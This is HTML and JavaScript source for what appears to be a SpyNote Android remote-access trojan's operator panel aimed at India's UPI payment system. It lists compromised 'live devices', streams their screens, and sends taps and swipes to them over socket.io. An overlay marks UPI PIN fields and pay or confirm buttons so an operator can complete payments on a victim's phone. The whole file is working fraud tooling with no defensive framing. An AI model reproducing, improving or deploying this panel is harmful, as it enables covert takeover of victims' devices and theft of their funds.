<!DOCTYPE html>
<html>
<head>
    <title>üì± SpyNote 7.3.1 - UPI Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif; 
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%); 
            color: white; height: 100vh; overflow: hidden;
        }
        #devices {
            position: fixed; top: 15px; left: 15px; background: rgba(0,0,0,0.95); 
            padding: 20px; max-height: 85vh; overflow-y: auto; width: 300px; 
            border-radius: 15px; backdrop-filter: blur(20px); border: 1px solid #00ff88;
        }
        .device { padding: 15px; margin: 10px 0; background: #222; cursor: pointer; 
            border-radius: 10px; transition: all 0.3s; border: 1px solid #444; }
        .device:hover { background: #444; transform: translateX(8px); }
        .active { background: linear-gradient(45deg, #00ff88, #00cc6a) !important; color: #000; box-shadow: 0 0 20px #00ff88; }
        .disconnected { opacity: 0.4; }

        #phone-frame {
            width: 380px; height: 820px; margin: 30px auto; 
            background: #111; border: 30px solid #222; border-radius: 60px; 
            position: relative; cursor: pointer; touch-action: none;
            box-shadow: 0 25px 50px rgba(0,0,0,0.8);
        }
        #screen-canvas { 
            width: 100%; height: 100%; background: #000; border-radius: 25px;
            image-rendering: pixelated;
        }
        #layout-overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
            pointer-events: none; border-radius: 25px; z-index: 10;
        }
        .layout-element {
            position: absolute; background: rgba(0,255,136,0.4); border: 2px solid #00ff88;
            border-radius: 6px; transition: all 0.2s; pointer-events: auto;
        }
        .layout-element:hover { background: rgba(0,255,136,0.7); transform: scale(1.05); box-shadow: 0 0 10px #00ff88; }
        .pin-element { background: rgba(255,69,0,0.6) !important; border-color: #ff4500 !important; }
        .pin-element:hover { background: rgba(255,69,0,0.9) !important; box-shadow: 0 0 15px #ff4500; }
        .done-element { background: rgba(0,255,0,0.6) !important; border-color: #00ff00 !important; }
        .done-element:hover { background: rgba(0,255,0,0.9) !important; box-shadow: 0 0 15px #00ff00; }

        #stats { 
            position: fixed; top: 15px; right: 15px; background: rgba(0,0,0,0.95); 
            padding: 20px; border-radius: 15px; font-size: 13px; text-align: left; 
            backdrop-filter: blur(20px); border: 1px solid #00ff88; min-width: 200px;
        }
        #controls { 
            position: fixed; bottom: 25px; left: 50%; transform: translateX(-50%); 
            display: flex; gap: 10px; background: rgba(0,0,0,0.95); padding: 15px 25px;
            border-radius: 30px; backdrop-filter: blur(20px); border: 1px solid #00ff88;
        }
        button {
            padding: 12px 20px; background: linear-gradient(45deg, #00ff88, #00cc6a); 
            color: #000; border: none; border-radius: 20px; cursor: pointer; 
            font-weight: 600; transition: all 0.3s; box-shadow: 0 5px 20px rgba(0,255,136,0.4);
        }
        button:hover { transform: translateY(-3px); box-shadow: 0 8px 30px rgba(0,255,136,0.6); }
        .layout-toggle { background: linear-gradient(45deg, #ff6b6b, #ee5a5a); color: white; }
        .layout-toggle.active { background: linear-gradient(45deg, #00ff88, #00cc6a); color: #000; }
        #pin-panel {
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            background: rgba(0,0,0,0.95); padding: 30px; border-radius: 20px;
            border: 2px solid #00ff88; display: none; backdrop-filter: blur(20px);
            text-align: center; min-width: 300px;
        }
    </style>
</head>
<body>
    <div id="devices">
        <h3 style="margin-bottom: 15px; color: #00ff88;">üì± Live Devices</h3>
        <div id="device-list">Loading devices...</div>
    </div>
    
    <div id="stats">
        <div>Status: <span id="status" style="color: #ff6b6b;">Connecting...</span></div>
        <div>FPS: <span id="fps">0</span> | Ping: <span id="ping">-</span>ms</div>
        <div>Device: <span id="deviceName">-</span></div>
        <div>Layout: <span id="layoutInfo" style="color: #aaa;">OFF</span> | Pins: <span id="pinCount">0</span></div>
    </div>

    <div id="phone-frame">
        <canvas id="screen-canvas"></canvas>
        <canvas id="layout-overlay"></canvas>
    </div>

    <div id="controls">
        <button onclick="sendBack()">üîô Back</button>
        <button onclick="sendHome()">üè† Home</button>
        <button class="layout-toggle" onclick="toggleLayout()" id="layoutBtn">üó∫Ô∏è Layout</button>
        <button onclick="toggleFullScreen()">üì± Full</button>
    </div>

    <div id="pin-panel">
        <h3 style="color: #00ff88; margin-bottom: 20px;">üéØ UPI PIN Elements</h3>
        <div id="pin-list" style="max-height: 300px; overflow-y: auto; margin-bottom: 20px;"></div>
        <button onclick="closePinPanel()" style="background: #ff6b6b; color: white;">Close</button>
    </div>

    <script>
        const socket = io({ transports: ['websocket'], upgrade: false });
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 2400;
        let frameCount = 0, lastFrameTime = 0, avgFps = 0, pingInterval;
        let frameQueue = [];
        let isDragging = false, dragStart = {};
        let showLayout = false;
        let layoutElements = [];
        let canvas, ctx, overlayCtx, phoneFrame;

        canvas = document.getElementById('screen-canvas');
        ctx = canvas.getContext('2d');
        overlayCtx = document.getElementById('layout-overlay').getContext('2d');
        phoneFrame = document.getElementById('phone-frame');

        socket.on('connect', () => {
            document.getElementById('status').textContent = 'üü¢ LIVE';
            document.getElementById('status').style.color = '#00ff88';
            pingInterval = setInterval(() => {
                const start = Date.now();
                socket.emit('ping', () => {
                    document.getElementById('ping').textContent = Date.now() - start;
                });
            }, 1000);
        });

        socket.on('devices-update', (devices) => {
            updateDeviceList(devices);
        });

        socket.on('screen-update', (data) => {
            if (data.deviceId !== currentDevice) return;
            
            frameQueue.push(data);
            if (frameQueue.length === 1) renderNextFrame();
            
            frameCount++;
            const now = performance.now();
            if (now - lastFrameTime >= 1000) {
                avgFps = Math.round(frameCount * 1000 / (now - lastFrameTime));
                document.getElementById('fps').textContent = avgFps;
                frameCount = 0;
                lastFrameTime = now;
            }
        });

        function renderNextFrame() {
            if (frameQueue.length === 0) return;
            
            const data = frameQueue.shift();
            const img = new Image();
            
            img.onload = () => {
                const rect = phoneFrame.getBoundingClientRect();
                canvas.width = rect.width;
                canvas.height = rect.height;
                
                ctx.imageSmoothingEnabled = false;
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                
                if (showLayout && data.layout && data.layout.length > 0) {
                    renderLayoutOverlay(data.layout, rect);
                }
                
                if (frameQueue.length > 0) {
                    requestAnimationFrame(renderNextFrame);
                }
            };
            
            img.src = `data:image/jpeg;base64,${data.data}`;
            deviceWidth = data.width || 1080;
            deviceHeight = data.height || 2400;
        }

        function renderLayoutOverlay(layout, rect) {
            const overlayCanvas = document.getElementById('layout-overlay');
            overlayCanvas.width = rect.width;
            overlayCanvas.height = rect.height;
            
            overlayCtx.clearRect(0, 0, rect.width, rect.height);
            layoutElements = [];
            let pinCount = 0;
            
            layout.forEach((element, index) => {
                const bounds = element.bounds;
                const x = (bounds.left / deviceWidth) * rect.width;
                const y = (bounds.top / deviceHeight) * rect.height;
                const w = ((bounds.right - bounds.left) / deviceWidth) * rect.width;
                const h = ((bounds.bottom - bounds.top) / deviceHeight) * rect.height;
                
                let elementClass = 'layout-element';
                if (element.isPin) {
                    elementClass = 'pin-element';
                    pinCount++;
                } else if (element.text && (element.text.toLowerCase().includes('done') || 
                                           element.text.toLowerCase().includes('pay') ||
                                           element.text.toLowerCase().includes('confirm'))) {
                    elementClass = 'done-element';
                }
                
                overlayCtx.fillStyle = elementClass === 'pin-element' ? 'rgba(255,69,0,0.4)' : 
                                     elementClass === 'done-element' ? 'rgba(0,255,0,0.4)' : 'rgba(0,255,136,0.3)';
                overlayCtx.strokeStyle = elementClass === 'pin-element' ? '#ff4500' : 
                                       elementClass === 'done-element' ? '#00ff00' : '#00ff88';
                overlayCtx.lineWidth = 3;
                overlayCtx.strokeRect(x, y, w, h);
                overlayCtx.font = 'bold 12px monospace';
                overlayCtx.fillStyle = elementClass === 'pin-element' ? '#ff4500' : 
                                     elementClass === 'done-element' ? '#00ff00' : '#00ff88';
                overlayCtx.fillText(`${element.text?.slice(0,6) || element.contentDescription?.slice(0,6) || '?'}`, x+4, y+18);
                
                layoutElements.push({ 
                    x, y, w, h, 
                    element, 
                    isPin: element.isPin,
                    isDone: elementClass === 'done-element',
                    index 
                });
            });
            
            document.getElementById('pinCount').textContent = pinCount;
            document.getElementById('layoutInfo').textContent = `${pinCount} Pins | ${layout.length} Elements`;
        }

        function updateDeviceList(devices) {
            const list = document.getElementById('device-list');
            list.innerHTML = devices.length ? 
                devices.map(([id, info]) => `
                    <div class="device ${!info.connected ? 'disconnected' : ''}" 
                         onclick="selectDevice('${id}', this)">
                        <b>${info.model?.slice(0,12) || id.slice(0,8)}</b><br>
                        <small>${info.brand || ''} - Android ${info.version || ''}</small><br>
                        <span style="color: ${info.connected ? '#00ff88' : '#ff6b6b'}">
                            ${info.connected ? 'üü¢ LIVE' : 'üî¥ OFFLINE'}
                        </span>
                    </div>
                `).join('') : '<div style="color:#666;">No devices online</div>';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            document.getElementById('deviceName').textContent = deviceId.slice(0,12);
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            frameQueue = [];
            socket.emit('select-device', deviceId);
        }

        function getScaledCoords(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            return {
                x: Math.floor((clientX - rect.left) * (deviceWidth / rect.width)),
                y: Math.floor((clientY - rect.top) * (deviceHeight / rect.height))
            };
        }

        // Mouse events
        ['mousedown', 'mousemove', 'mouseup'].forEach(event => {
            phoneFrame.addEventListener(event, (e) => {
                e.preventDefault();
                const coords = getScaledCoords(e.clientX, e.clientY);
                
                if (event === 'mousedown') {
                    isDragging = true;
                    dragStart = coords;
                    sendTap(coords.x, coords.y);
                } else if (event === 'mousemove' && isDragging) {
                    sendSwipe(dragStart.x, dragStart.y, coords.x, coords.y);
                } else if (event === 'mouseup') {
                    isDragging = false;
                }
            });
        });

        // Touch events
        ['touchstart', 'touchmove', 'touchend'].forEach(event => {
            phoneFrame.addEventListener(event, (e) => {
                e.preventDefault();
                const touch = e.touches[0] || e.changedTouches[0];
                const coords = getScaledCoords(touch.clientX, touch.clientY);
                
                if (event === 'touchstart') {
                    isDragging = true;
                    dragStart = coords;
                    sendTap(coords.x, coords.y);
                } else if (event === 'touchmove' && isDragging) {
                    sendSwipe(dragStart.x, dragStart.y, coords.x, coords.y);
                } else if (event === 'touchend') {
                    isDragging = false;
                }
            }, { passive: false });
        });

        function sendTap(x, y) {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'tap', x, y });
        }

        function sendSwipe(sx, sy, ex, ey) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'swipe', 
                startX: sx, startY: sy, endX: ex, endY: ey, duration: 200 
            });
        }

        function sendBack() { if (currentDevice) socket.emit('control', { deviceId: currentDevice, action: 'back' }); }
        function sendHome() { if (currentDevice) socket.emit('control', { deviceId: currentDevice, action: 'home' }); }

        function toggleLayout() {
            showLayout = !showLayout;
            const btn = document.getElementById('layoutBtn');
            const info = document.getElementById('layoutInfo');
            btn.textContent = showLayout ? 'üìã Hide Layout' : 'üó∫Ô∏è Show Layout';
            btn.classList.toggle('active');
            info.style.color = showLayout ? '#00ff88' : '#aaa';
        }

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }

        // Layout element click handler
        phoneFrame.addEventListener('click', (e) => {
            if (!showLayout || !currentDevice || layoutElements.length === 0) return;
            
            const rect = phoneFrame.getBoundingClientRect();
            const x = e.clientX - rect.left;
            const y = e.clientY - rect.top;
            
            const clickedElement = layoutElements.find(el => 
                x >= el.x && x <= (el.x + el.w) &&
                y >= el.y && y <= (el.y + el.h)
            );
            
            if (clickedElement) {
                const bounds = clickedElement.element.bounds;
                const tapX = bounds.centerX;
                const tapY = bounds.centerY;
                sendTap(tapX, tapY);
                
                console.log('üéØ CLICKED:', clickedElement.element.text || clickedElement.element.contentDescription);
                
                if (clickedElement.isPin || clickedElement.isDone) {
                    showPinPanel(clickedElement);
                }
            }
        });

        function showPinPanel(element) {
            const panel = document.getElementById('pin-panel');
            const list = document.getElementById('pin-list');
            
            list.innerHTML = `
                <div style="padding: 10px; background: rgba(0,255,136,0.2); border-radius: 8px; margin: 5px 0;">
                    <b>${element.element.text || element.element.contentDescription || 'PIN'}</b><br>
                    <small>Position: (${Math.round(element.element.bounds.centerX)}, ${Math.round(element.element.bounds.centerY)})</small>
                </div>
            `;
            panel.style.display = 'block';
        }

        function closePinPanel() {
            document.getElementById('pin-panel').style.display = 'none';
        }

        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') closePinPanel();
        });
    </script>
</body>
</html>
